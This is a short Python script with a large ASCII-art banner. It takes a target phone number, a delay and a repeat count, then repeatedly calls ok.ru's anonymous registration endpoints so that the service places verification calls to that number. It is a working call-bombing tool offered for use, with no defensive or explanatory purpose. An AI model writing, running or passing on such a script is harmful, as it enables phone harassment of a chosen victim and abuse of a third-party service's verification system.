ZME= """"

                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                           `-/oyhys/`                                                               
                       `:odNNNMNmmMNm/                                                              
                    .+hmNMNhs/-.``/NMN:                                                             
                 `:ymMNds:.`       +MMm.                                                            
                -hNMms:`           `hMMy                                                            
                dMMs.               .mMM+                                                           
               `mMM:                 :NMN-                                                          
                hMMo                  oMMd`                  `/+/-.`                                
                oMMh                  `hMMs                  .mNMNmdy+-`                            
                -MMN`                  .NMN/                  .-/ohdNMNdo-`                         
                `mMM/                   /MMm`                      `-+hNMNh/`                       
                 oMMd                   -NMN.                          -omMMd/`                     
                 .NMN:                `/mMNs                             `+mMMh-                    
                  sMMh               -hMMm/                                .sNMN/                   
                  .NMM:            `+NMNs.                `--.`              /mMNo                  
                   oMMd`          `hMMm:                  /NMNdy/`            -mMN+                 
                   `dMMo           yMMh`                  `/oymNMmo`           :NMN-                
                    -NMN:          `dMMy                      `/dMMd-           sMMh                
                     +MMm.          .mMMs                       `oMMN-          `hms                
                      yMMh`          .mMMs                        sMMh                              
                      `hMMy           .dMMy`                      `+o-                              
                       `dMMs           `dMMd.                                                       
                        .mMMs           `yMMm:                                                      
                         .dMMy`           +NMNo`                                                    
                          .hMMh`           -dMMd-                                                   
                           `yMMd-           `oNMNs`                                                 
                            `oNMm/            -hMMm/`         ``                                    
                              /mMNs`           `/mMNd: `.-/oydmmmh+.                                
                               .hMMd:            `omMNdmNNMMNdhydMMms.                              
                                `+NMNs`            .odmhyo/-.`` `:hNMNs-                            
                                  -hNMd/             ```          `-yNMNy:                          
                                   `/mMNh-                           -smMNh:`                       
                                     .smMNy-                           .omMNh/`                     
                                       -yNMNs-                           .omMMd+`                   
                                         -yNMNy-`                          .+dMMh`                  
                                           -smMNh/`                          `mMM:                  
                                             -omMMdo.                       `+NMN-                  
                                               ./hNMNy/.                  `:hMMm:                   
                                                  -smNMmy:`             `:yNMNo.                    
                                                    `/ymNMmy/.`       .+hNMms-                      
                                                       `/ymNMNho-``.+yNMNdo.                        
                                                          `:sdNMMmmNMNms:`                          
                                                              ./syhy+-`                             
                                                                                                    
                                                                             


"""


import requests
import time
print(ZME)
print("number to call")
a = int(input())
print("time?")
k = int(input())
print("how many?")
p = int(input())
list=[a]
for i in list:
  for j in range(p):
    ##call
    s = requests.session()
    payload = {'st.r.phone': i}
    response =s.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone", data = payload)
    print (response.status_code)
    time.sleep(1)
    payload2 = {'st.r.fieldAcceptCallUIButton': 'Call'}
    response =s.post("https://ok.ru/dk?cmd=AnonymRegistrationAcceptCallUI&st.cmd=anonymRegistrationAcceptCallUI", data = payload2)
    print (response.status_code, response.reason, j)
    time.sleep(k)
    
